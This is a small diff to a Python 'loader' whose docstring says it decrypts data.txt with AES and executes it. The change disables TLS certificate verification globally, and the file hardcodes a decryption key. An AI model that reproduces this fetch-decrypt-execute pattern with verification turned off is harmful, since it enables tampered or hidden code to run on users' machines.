@@ -1,6 +1,7 @@
 # -*- coding: utf-8 -*-
 """뚱시스템 로더 — data.txt AES 복호화 + 실행"""
-import urllib.request, base64, zlib, json, time
+import urllib.request, base64, zlib, json, time, ssl
+ssl._create_default_https_context = ssl._create_unverified_context
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
 KEY = base64.b64decode("W5EwW1vV8EFoNKQsgTCrKmfZzbflm0JDU7MuNG8izu4=")
